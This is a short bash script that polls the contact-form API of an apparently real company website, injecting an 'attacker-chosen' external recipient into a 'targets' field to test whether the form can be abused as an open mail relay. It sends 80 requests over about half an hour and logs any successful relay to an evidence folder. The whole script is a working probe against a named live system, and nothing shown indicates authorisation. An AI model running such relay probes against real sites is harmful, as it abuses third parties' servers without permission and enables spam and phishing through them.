#!/bin/bash
# Independent verifier: paced poll of POST https://www.infinitycapital.bh/api/send
# with an ATTACKER-CHOSEN, non-site recipient, to detect any successful relay.
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36'
URL='https://www.infinitycapital.bh/api/send'
OUT=/work/evidence/IVRELAY
mkdir -p "$OUT"
TAG="ivrelay-$(date +%s)-$$"
RCP="ivrelay-$(date +%s)@mailinator.com"
for i in $(seq 1 40); do
  T=$(date -u +%H:%M:%SZ)
  EXT=$(curl -s -o "$OUT/${TAG}_ext.$i.json" -w '%{http_code}' -A "$UA" -X POST "$URL" \
    -F "fname=Independent" -F "lname=Verifier" -F "areacode=973" -F "tel=5550100" \
    -F "cname=Northbridge Holdings" -F "subject=Account document review" \
    -F "msg=Security verification message $TAG. Please disregard." \
    -F "check=0" -F "targets=$RCP")
  CTL=$(curl -s -o "$OUT/${TAG}_ctl.$i.json" -w '%{http_code}' -A "$UA" -X POST "$URL" \
    -F "fname=Independent" -F "lname=Verifier" -F "areacode=973" -F "tel=5550100" \
    -F "cname=Northbridge Holdings" -F "subject=Account document review" \
    -F "msg=Security verification message $TAG. Please disregard." \
    -F "check=0" -F "targets=probe@nonexistent-tld-zz.invalid")
  { echo "[$T] iter=$i ext_http=$EXT ctl_http=$CTL"
    echo "   ext: $(head -c 300 "$OUT/${TAG}_ext.$i.json")"
    echo "   ctl: $(head -c 300 "$OUT/${TAG}_ctl.$i.json")"; } >> "$OUT/poll.log"
  if grep -q '"data":{' "$OUT/${TAG}_ext.$i.json" 2>/dev/null; then
    echo "*** SUCCESSFUL RELAY at $T ***" >> "$OUT/poll.log"
    break
  fi
  sleep 40
done
echo "RECIPIENT_USED=$RCP" >> "$OUT/poll.log"
